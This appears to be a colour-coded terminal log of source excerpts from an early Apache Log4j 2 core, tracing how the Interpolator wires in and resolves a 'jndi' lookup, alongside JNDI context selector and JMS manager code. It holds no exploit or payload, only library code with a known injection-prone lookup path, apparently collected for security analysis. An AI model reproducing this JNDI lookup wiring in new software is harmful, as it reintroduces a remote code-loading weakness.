[2;36m                    [0m         [1;36m66[0m[39m:        [0m[1;35mlookups.put[0m[1;39m([0m[32m"jndi"[0m[39m, new [0m[1;35mJndiLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.jav[0m[1;92ma:99[0m[39m-[0m[1;36m124[0m    [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m99[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m100[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, String var[0m[1;39m)[0m[39m [0m[1;39m{[0m                    [2m                [0m
[2;36m                    [0m         [1;36m101[0m[39m:        if [0m[1;39m([0m[39mvar == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m102[0m[39m:            return null;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m103[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m104[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m105[0m[39m:        final int prefixPos = [0m[1;35mvar.indexOf[0m[1;39m([0m[39mPREFIX_SEPARATOR[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m106[0m[39m:        if [0m[1;39m([0m[39mprefixPos >= [0m[1;36m0[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m107[0m[39m:            final String prefix = [0m[1;35mvar.substring[0m[1;39m([0m[1;36m0[0m[39m, prefixPos[0m[1;39m)[0m[39m;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m108[0m[39m:            final String name = [0m[1;35mvar.substring[0m[1;39m([0m[39mprefixPos + [0m[1;36m1[0m[1;39m)[0m[39m;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m109[0m[39m:            final StrLookup lookup = [0m[1;35mlookups.get[0m[1;39m([0m[39mprefix[0m[1;39m)[0m[39m;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m110[0m[39m:            String value = null;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m111[0m[39m:            if [0m[1;39m([0m[39mlookup != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m112[0m[39m:                value = event == null ? [0m[1;35mlookup.lookup[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m : [0m                  [2m                [0m
[2;36m                    [0m         [1;35mlookup.lookup[0m[1;39m([0m[39mevent, name[0m[1;39m)[0m[39m;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m113[0m[39m:            [0m[1;39m}[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m114[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m115[0m[39m:            if [0m[1;39m([0m[39mvalue != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m116[0m[39m:                return value;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m117[0m[39m:            [0m[1;39m}[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m118[0m[39m:            var = [0m[1;35mvar.substring[0m[1;39m([0m[39mprefixPos + [0m[1;36m1[0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m119[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m120[0m[39m:        if [0m[1;39m([0m[39mdefaultLookup != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m121[0m[39m:            return event == null ? [0m[1;35mdefaultLookup.lookup[0m[1;39m([0m[39mvar[0m[1;39m)[0m[39m : [0m                 [2m                [0m
[2;36m                    [0m         [1;35mdefaultLookup.lookup[0m[1;39m([0m[39mevent, var[0m[1;39m)[0m[39m;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m122[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m123[0m[39m:        return null;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m124[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/DateLookup.jav[0m[1;92ma:19[0m[39m-[0m[1;36m26[0m       [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import java.text.DateFormat;[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import java.text.SimpleDateFormat;[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:import java.util.Date;[0m                                                           [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.Logger;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:import org.apache.logging.log4j.core.config.plugins.Plugin;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:import org.apache.logging.log4j.status.StatusLogger;[0m                             [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/DateLookup.jav[0m[1;92ma:31[0m[39m-[0m[1;36m70[0m       [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"date"[0m[39m, category = [0m[32m"Lookup"[0m[1;39m)[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:public class DateLookup implements StrLookup [0m[1;39m{[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    private static final Logger LOGGER = [0m[1;35mStatusLogger.getLogger[0m[1;39m([0m[1;39m)[0m[39m;[0m               [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:     * Get the value of the environment variable.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:     * @param key the format to use. If null, the default DateFormat will be [0m    [2m                [0m
[2;36m                    [0m         [39mused.[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:     * @return The value of the environment variable.[0m                            [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal String key[0m[1;39m)[0m[39m [0m[1;39m{[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:        return [0m[1;35mformatDate[0m[1;39m([0m[1;35mSystem.currentTimeMillis[0m[1;39m([0m[1;39m)[0m[39m, key[0m[1;39m)[0m[39m;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:     * Get the value of the environment variable.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:     * @param event The current LogEvent [0m[1;39m([0m[39mis ignored by this StrLookup[0m[1;39m)[0m[39m.[0m         [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:     * @param key the format to use. If null, the default DateFormat will be [0m    [2m                [0m
[2;36m                    [0m         [39mused.[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:     * @return The value of the environment variable.[0m                            [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:        return [0m[1;35mformatDate[0m[1;39m([0m[1;35mevent.getMillis[0m[1;39m([0m[1;39m)[0m[39m, key[0m[1;39m)[0m[39m;[0m                               [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:    private String [0m[1;35mformatDate[0m[1;39m([0m[39mfinal long date, final String format[0m[1;39m)[0m[39m [0m[1;39m{[0m            [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:        DateFormat dateFormat = null;[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        if [0m[1;39m([0m[39mformat != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:            try [0m[1;39m{[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:                dateFormat = new [0m[1;35mSimpleDateFormat[0m[1;39m([0m[39mformat[0m[1;39m)[0m[39m;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:            [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal Exception ex[0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:                [0m[1;35mLOGGER.error[0m[1;39m([0m[32m"Invalid date format: \""[0m[39m + format + [0m[32m"\", using [0m    [2m                [0m
[2;36m                    [0m         [32mdefault"[0m[39m, ex[0m[1;39m)[0m[39m;[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        if [0m[1;39m([0m[39mdateFormat == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:            dateFormat = [0m[1;35mDateFormat.getInstance[0m[1;39m([0m[1;39m)[0m[39m;[0m                               [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:        return [0m[1;35mdateFormat.format[0m[1;39m([0m[39mnew [0m[1;35mDate[0m[1;39m([0m[39mdate[0m[1;39m)[0m[1;39m)[0m[39m;[0m                                [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter.ja[0m [2m                [0m
[2;36m                    [0m         [39mv[0m[1;92ma:28[0m[39m-[0m[1;36m30[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"MessagePatternConverter"[0m[39m, category = [0m[32m"Converter"[0m[1;39m)[0m                [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:@[0m[1;35mConverterKeys[0m[1;39m([0m[1;39m{[0m[32m"m"[0m[39m, [0m[32m"msg"[0m[39m, [0m[32m"message"[0m[39m [0m[1;39m}[0m[1;39m)[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:public final class MessagePatternConverter extends LogEventPatternConverter [0m[1;39m{[0m    [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/helpers/FileUtils.jav[0m[1;92ma:56[0m[39m-[0m[1;36m75[0m       [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:        [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                                                 [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:            if [0m[1;39m([0m[1;35muri.getScheme[0m[1;39m([0m[1;39m)[0m[39m == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:                try [0m[1;39m{[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:                    uri = new [0m[1;35mFile[0m[1;39m([0m[1;35muri.getPath[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[1;35m.toURI[0m[1;39m([0m[1;39m)[0m[39m;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:                [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal Exception ex[0m[1;39m)[0m[39m [0m[1;39m{[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:                    [0m[1;35mLOGGER.warn[0m[1;39m([0m[32m"Invalid URI "[0m[39m + uri[0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:                    return null;[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:                [0m[1;39m}[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:            try [0m[1;39m{[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:                return new [0m[1;35mFile[0m[1;39m([0m[1;35mURLDecoder.decode[0m[1;39m([0m[1;35muri.toURL[0m[1;39m([0m[1;39m)[0m[1;35m.getFile[0m[1;39m([0m[1;39m)[0m[39m, [0m        [2m                [0m
[2;36m                    [0m         [32m"UTF8"[0m[1;39m)[0m[1;39m)[0m[39m;[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:            [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal MalformedURLException ex[0m[1;39m)[0m[39m [0m[1;39m{[0m                           [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:                [0m[1;35mLOGGER.warn[0m[1;39m([0m[32m"Invalid URL "[0m[39m + uri, ex[0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:            [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal UnsupportedEncodingException uee[0m[1;39m)[0m[39m [0m[1;39m{[0m                   [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:                [0m[1;35mLOGGER.warn[0m[1;39m([0m[32m"Invalid encoding: UTF8"[0m[39m, uee[0m[1;39m)[0m[39m;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/selector/JNDIContextSelector.jav[0m[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m110[0m[39m-[0m[1;36m122[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m110[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m111[0m[39m:        String loggingContextName = null;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m112[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m113[0m[39m:        try [0m[1;39m{[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m114[0m[39m:            final Context ctx = new [0m[1;35mInitialContext[0m[1;39m([0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m115[0m[39m:            loggingContextName = [0m[1;39m([0m[39mString[0m[1;39m)[0m[39m [0m[1;35mlookup[0m[1;39m([0m[39mctx, [0m                          [2m                [0m
[2;36m                    [0m         [39mConstants.JNDI_CONTEXT_NAME[0m[1;39m)[0m[39m;[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m116[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal NamingException ne[0m[1;39m)[0m[39m [0m[1;39m{[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m117[0m[39m:            [0m[1;35mLOGGER.error[0m[1;39m([0m[32m"Unable to lookup "[0m[39m + Constants.JNDI_CONTEXT_NAME, [0m    [2m                [0m
[2;36m                    [0m         [39mne[0m[1;39m)[0m[39m;[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m118[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m119[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m120[0m[39m:        return loggingContextName == null ? CONTEXT : [0m                          [2m                [0m
[2;36m                    [0m         [1;35mlocateContext[0m[1;39m([0m[39mloggingContextName, configLocation[0m[1;39m)[0m[39m;[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m121[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m122[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/net/AbstractJMSManager.jav[0m[1;92ma:23[0m[39m-[0m[1;36m108[0m [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import javax.jms.MessageProducer;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:import javax.jms.ObjectMessage;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:import javax.jms.Session;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:import javax.jms.TextMessage;[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:import javax.naming.Context;[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:import javax.naming.InitialContext;[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:import javax.naming.NameNotFoundException;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:import javax.naming.NamingException;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:import org.apache.logging.log4j.core.appender.AbstractManager;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m: * Base Class for Managers of JMS connections.[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:public abstract class AbstractJMSManager extends AbstractManager [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     * The Constructor.[0m                                                          [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:     * @param name The name of the Appender.[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:    public [0m[1;35mAbstractJMSManager[0m[1;39m([0m[39mfinal String name[0m[1;39m)[0m[39m [0m[1;39m{[0m                               [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:        [0m[1;35msuper[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m;[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:     * Create the InitialContext.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:     * @param factoryName The fully qualified class name of the [0m                 [2m                [0m
[2;36m                    [0m         [39mInitialContextFactory.[0m                                                              [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:     * @param providerURL The URL of the provider to use.[0m                        [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:     * @param urlPkgPrefixes A colon-separated list of package prefixes for the [0m [2m                [0m
[2;36m                    [0m         [39mclass name of the factory class that[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:     * will create a URL context factory[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:     * @param securityPrincipalName The name of the identity of the Principal.[0m   [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:     * @param securityCredentials The security credentials of the Principal.[0m     [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:     * @return the InitialContext.[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:     * @throws NamingException if a naming error occurs.[0m                         [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:    protected static Context [0m[1;35mcreateContext[0m[1;39m([0m[39mfinal String factoryName, final [0m      [2m                [0m
[2;36m                    [0m         [39mString providerURL,[0m                                                                 [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:                                           final String urlPkgPrefixes, final [0m   [2m                [0m
[2;36m                    [0m         [39mString securityPrincipalName,[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:                                           final String securityCredentials[0m[1;39m)[0m     [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:        throws NamingException [0m[1;39m{[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        final Properties props = [0m[1;35mgetEnvironment[0m[1;39m([0m[39mfactoryName, providerURL, [0m       [2m                [0m
[2;36m                    [0m         [39murlPkgPrefixes, securityPrincipalName,[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:                                          securityCredentials[0m[1;39m)[0m[39m;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        return new [0m[1;35mInitialContext[0m[1;39m([0m[39mprops[0m[1;39m)[0m[39m;[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:     * Looks up the name in the context.[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:     * @param ctx The Context.[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:     * @param name The name to locate.[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:     * @return The object to be located.[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:     * @throws NamingException If an error occurs locating the name.[0m             [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:    protected static Object [0m[1;35mlookup[0m[1;39m([0m[39mfinal Context ctx, final String name[0m[1;39m)[0m[39m throws [0m [2m                [0m
[2;36m                    [0m         [39mNamingException [0m[1;39m{[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        try [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:            return [0m[1;35mctx.lookup[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal NameNotFoundException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:            [0m[1;35mLOGGER.warn[0m[1;39m([0m[32m"Could not find name [0m[32m[[0m[32m"[0m[39m + name + [0m[32m"[0m[32m][0m[32m."[0m[1;39m)[0m[39m;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:            throw e;[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:     * Sets up the properties to pass to the InitialContext.[0m                     [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:     * @param factoryName The fully qualified class name of the [0m                 [2m                [0m
[2;36m                    [0m         [39mInitialContextFactory.[0m                                                              [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:     * @param providerURL The URL of the provider to use.[0m                        [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m:     * @param urlPkgPrefixes A colon-separated list of package prefixes for the [0m [2m                [0m
[2;36m                    [0m         [39mclass name of the factory class that[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m89[0m[39m:     * will create a URL context factory[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m90[0m[39m:     * @param securityPrincipalName The name of the identity of the Principal.[0m   [2m                [0m
[2;36m                    [0m         [1;36m91[0m[39m:     * @param securityCredentials The security credentials of the Principal.[0m     [2m                [0m
[2;36m                    [0m         [1;36m92[0m[39m:     * @return The Properties.[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m93[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m94[0m[39m:    protected static Properties [0m[1;35mgetEnvironment[0m[1;39m([0m[39mfinal String factoryName, final [0m  [2m                [0m
[2;36m                    [0m         [39mString providerURL,[0m                                                                 [2m                [0m
[2;36m                    [0m         [1;36m95[0m[39m:                                               final String urlPkgPrefixes, [0m     [2m                [0m
[2;36m                    [0m         [39mfinal String securityPrincipalName,[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m96[0m[39m:                                               final String securityCredentials[0m[1;39m)[0m [2m                [0m
[2;36m                    [0m         [1;39m{[0m                                                                                   [2m                [0m
[2;36m                    [0m         [1;36m97[0m[39m:        final Properties props = new [0m[1;35mProperties[0m[1;39m([0m[1;39m)[0m[39m;[0m                               [2m                [0m
[2;36m                    [0m         [1;36m98[0m[39m:        if [0m[1;39m([0m[39mfactoryName != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                               [2m                [0m
